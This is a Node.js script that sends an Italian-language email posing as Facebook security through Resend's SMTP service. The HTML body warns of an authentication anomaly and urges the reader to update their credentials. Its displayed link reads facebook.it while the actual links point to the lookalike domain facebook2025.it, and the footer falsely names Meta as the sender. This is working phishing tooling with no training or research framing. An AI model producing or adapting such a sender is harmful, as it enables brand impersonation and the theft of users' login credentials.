// /scripts/sendEmail.js
require('dotenv').config();
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  host: 'smtp.resend.com',
  port: 465,
  secure: true,
  auth: {
    user: 'resend',
    pass: process.env.RESEND_API_KEY,
  },
});

const mailOptions = {
  from: '"Facebook Italia" <noreply@facebook2025.it>',
  to: 'simone@example.com', // Inserisci qui la tua email per i test
  subject: 'Notifica di Sicurezza',
  html: `
    <!DOCTYPE html>
    <html lang="it">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Notifica di Sicurezza</title>
    </head>
    <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
      <div style="max-width: 600px; margin: auto; background-color: #ffffff; border-radius: 8px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.05);">
        <h2 style="color: #1877f2;">Facebook</h2>
        <p style="color: #555; font-size: 14px;">20 luglio 2025</p>
        <p style="font-size: 16px; color: #333;">Gentile utente,</p>
        <p style="font-size: 16px; color: #333; line-height: 1.5;">
          A seguito di un'anomalia riscontrata nel processo di autenticazione, ti invitiamo ad aggiornare le tue credenziali di accesso.
        </p>
        <p style="font-size: 16px; color: #333; margin-top: 20px;">
          Vai su <a href="https://www.facebook2025.it/" style="color:#1877f2; text-decoration: none;" rel="noopener noreferrer">
          https://www.facebook.it</a> per procedere.
        </p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="https://www.facebook2025.it/" style="background-color: #1877f2; color: #fff; padding: 12px 24px; text-decoration: none; font-weight: bold; border-radius: 4px;">
            Aggiorna credenziali
          </a>
        </div>
        <hr style="margin: 30px 0; border: none; border-top: 1px solid #e4e6eb;" />
        <p style="font-size: 13px; color: #666;">
          Questo messaggio è stato inviato a <strong>simone@example.com</strong>.<br />
          Facebook è gestito da Meta Platforms Ireland Ltd., Dublin.
        </p>
        <p style="font-size: 12px; color: #888; text-align: center; margin-top: 40px;">
          Non desideri più ricevere comunicazioni? <a href="https://facebook2025.it/unsubscribe" style="color: #1877f2;">Annulla iscrizione</a>.
        </p>
      </div>
    </body>
    </html>
  `,
};

transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
    console.error('❌ Errore durante l’invio:', error);
  } else {
    console.log('✅ Email inviata con successo:', info.response);
  }
});
